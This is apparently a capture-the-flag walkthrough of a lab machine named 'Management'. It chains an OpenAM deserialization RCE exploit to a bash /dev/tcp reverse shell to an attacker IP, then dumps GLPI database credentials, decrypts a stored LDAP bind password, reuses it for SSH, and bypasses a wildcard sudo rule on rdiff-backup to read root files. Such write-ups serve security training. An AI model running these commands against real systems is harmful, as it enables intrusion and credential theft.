# Management

## Find open ports and services running on the target IP

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals SSH (22), an nginx web server redirecting to HTTPS (80/443), an LDAP service with anonymous bind allowed (50389), and an SSL/LDAP "Administration Connector" service (4444).

Add `management.htb` to `/etc/hosts`. The TLS certificate SAN on port 443 reveals a second vhost, `sso.management.htb` — add that too.

The SSO is seen to be handled by OpenAM version 16.0.5.

---

## Discover Self-Service Credentials

Browsing the SSO portal's `main.js`, hardcoded self-service constants are found:

```text
ANONYMOUS_USERNAME = "anonymous"
ANONYMOUS_PASSWORD = "anonymous"
```

Confirmed as a real self-service account via the OpenAM REST API:

```bash
curl -sk "https://sso.management.htb/openam/json/realms/root/users/anonymous"
```

Authenticated as `anonymous` via the OpenAM REST auth flow and explored the account's access — it turned out to be locked to a bare `ui-self-service-user` role (empty profile, no read/write beyond its own record, no group memberships, no console access). Every attempt to widen this (profile writes, broad user/group queries, forgotten-password flow, realm listing) was denied by ACL. This confirmed the account was a dead end for direct escalation and that the real path had to be the OpenAM service itself.

---

## Exploit OpenAM RCE Vulnerability

The OpenAM application (16.0.5) is vulnerable to **CVE-2026-33439**, a pre-authentication RCE via unsafe Java deserialization of the `jato.clientSession` HTTP parameter — a bypass of the `WhitelistObjectInputStream` mitigation that patched the older `jato.pageSession` bug (CVE-2021-35464).

Reference: `GHSA-2cqq-rpvq-g5qj`

Exploit used:

https://github.com/infernosalex/CVE-2026-33439-Python-PoC/blob/main/exploit.py


```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
```

A reverse shell is obtained by supplying a reverse shell one-liner as the command:

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<listener_port> 0>&1"'
```

Start a Netcat listener:

```bash
nc -lvnp <listener_port>
```

A reverse shell connection is received.

---

## Obtain Initial Shell as openam

Check the current user:

```bash
whoami
```

Output:

```text
openam
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## The Search for owen's Credentials

Target user `owen` is found in `/etc/passwd`. The obvious next step — the OpenDJ directory backing the whole SSO stack — was tried first and led nowhere:

- `export-ldif` on the `userRoot` backend prompted for the `cn=Directory Manager` password, which wasn't known.
- No `.ldif`, `.properties`, or `boot.json` file on disk contained a usable stored bind credential for that account.

A hint to check **"config_db and services running"** redirected the search. `ps aux` showed, alongside the `openam` Java process, a running **MariaDB** instance and a **php-fpm** pool — services that had nothing to do with OpenAM/OpenDJ. That pointed at a separate web application using a local MySQL database, so the search shifted from LDAP internals to hunting for that app's config on disk:

```bash
find / -iname "*.php" 2>/dev/null | xargs grep -l "mysqli\|PDO\|DB_PASS\|config_db" 2>/dev/null
```

This turned up a large PHP codebase at `/opt/glpi` — a full **GLPI** IT asset/service-management installation, fitting the "managed services" theme of the box (`management.htb`'s landing page describes exactly this kind of offering). GLPI apps store their DB connection details in a predictable, standard file, which was the actual "config_db" being hinted at:

```bash
cat /opt/glpi/config/config_db.php
```

---

## Enumerate GLPI Database

```text
dbuser: glpi
dbpassword: 8rhu0L6Pw4Y7
dbdefault: glpidb
```

Dump the users table:

```bash
mysql -u glpi -p8rhu0L6Pw4Y7 -h 127.0.0.1 -D glpidb -e "SELECT id, name, password FROM glpi_users;"
```

Only default GLPI accounts are present (`glpi`, `post-only`, `tech`, `normal`) — no match for `owen`. Since GLPI centralizes IT/user management and this box's identity backend is LDAP, the natural next place to check was whether GLPI syncs accounts *from* the directory — which would mean a stored LDAP bind credential somewhere in its config tables.

---

## Decrypt LDAP Service Account Password

Query the LDAP directory-sync configuration:

```bash
mysql -u glpi -p8rhu0L6Pw4Y7 -h 127.0.0.1 -D glpidb -e "SELECT * FROM glpi_authldaps\G"
```

Discovered:

```text
rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

The value is **encrypted**, not hashed — GLPI needs the plaintext to bind to LDAP itself, so it stores this reversibly rather than as a one-way hash.

Locate GLPI's encryption key:

```bash
cat /opt/glpi/config/glpicrypt.key
```

Rather than guess at the crypto scheme, the source was read directly (`/opt/glpi/src/GLPIKey.php`) to confirm the exact algorithm — raw libsodium XChaCha20-Poly1305:

```text
value = base64(nonce[24 bytes] + ciphertext)
decrypt: sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(ciphertext, nonce, nonce, key)
```

Reimplemented the decrypt logic directly in PHP rather than relying on a mismatched library (an initial attempt using `defuse/php-encryption` failed — wrong library entirely, since GLPI uses raw sodium calls, not that package):

```bash
php -r '
$key = file_get_contents("/opt/glpi/config/glpicrypt.key");
$data = base64_decode("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");
$nonce = substr($data, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
$ciphertext = substr($data, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key) . PHP_EOL;
'
```

Output:

```text
WpczC40GhTbk
```

---

## Obtain User Shell via Password Reuse

Direct LDAP bind with `svc-glpi` and the decrypted password fails (`Invalid Credentials`) — likely a DN/auth-path mismatch, never fully resolved. Rather than keep fighting the LDAP bind, the password was tested against SSH as `owen` instead, on the theory that a human admin managing this integration may have reused the service account's password for their own login:

```bash
ssh owen@<target_ip>
# password: WpczC40GhTbk
```

Login succeeds — the password's *origin* was the service account config, but the actual foothold came from credential reuse by a person, not from successfully authenticating as `svc-glpi` itself.

---

## Retrieve User Flag

```bash
cat /home/owen/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Enumerate Sudo Rights

```bash
sudo -l
```

Discovered:

```text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
    --restrict-mode read-only *
```

`root` runs `rdiff-backup` in restricted server mode, jailed to `/opt/backup`, read-only.

---

## Analyze the Sudoers Rule

```bash
ls -la /opt/backup/
find /opt/backup -writable 2>/dev/null
```

No writable paths exist under `/opt/backup` — a symlink-based escape is not viable.

The sudoers rule ends in a wildcard (`*`), allowing arbitrary extra arguments to be appended **after** the fixed, matched prefix.

`rdiff-backup`'s argument parser takes the **last** occurrence of a repeated flag — appending a second `--restrict-path` / `--restrict-mode` pair after the required prefix overrides the jail to the filesystem root.

---

## Abuse the Wildcard for Restrict-Path Bypass

Drive the sudo'd server process from a local `rdiff-backup` client using a custom `--remote-schema`, mirroring `/root` locally:

```bash
rdiff-backup --remote-schema 'X=%s sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup --restrict-mode read-only \
  --restrict-path / --restrict-mode read-only' \
  localhost::/root /tmp/root_dump
```

(`X=%s` satisfies rdiff-backup's requirement that `--remote-schema` contain a `%s` substitution, without it being passed as a positional arg to `--server`, which accepts none. The original fixed prefix is kept intact so sudo's pattern match still succeeds; the override is appended afterward.)

Execution flow:

```text
owen
  |
  v
rdiff-backup client (--remote-schema)
  |
  v
sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup ... (matches NOPASSWD rule)
  |
  v
+ appended --restrict-path / --restrict-mode read-only (wildcard-permitted, overrides jail)
  |
  v
root-owned rdiff-backup server, unrestricted read access
  |
  v
/root mirrored to /tmp/root_dump
```

---

## Retrieve Root Flag

```bash
ls -la /tmp/root_dump/
cat /tmp/root_dump/root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
Anonymous LDAP/self-service (anonymous:anonymous) → OpenAM 16.0.5 fingerprinted →
CVE-2026-33439 pre-auth RCE (jato.clientSession) → Shell as openam →
"config_db" hint → GLPI found on disk → GLPI DB creds →
glpi_authldaps encrypted svc-glpi password → Decrypted via GLPI's libsodium GLPIKey scheme →
Password reuse → SSH as owen (user flag) →
sudo rdiff-backup wildcard arg injection → restrict-path bypass → Root Access (root flag)
```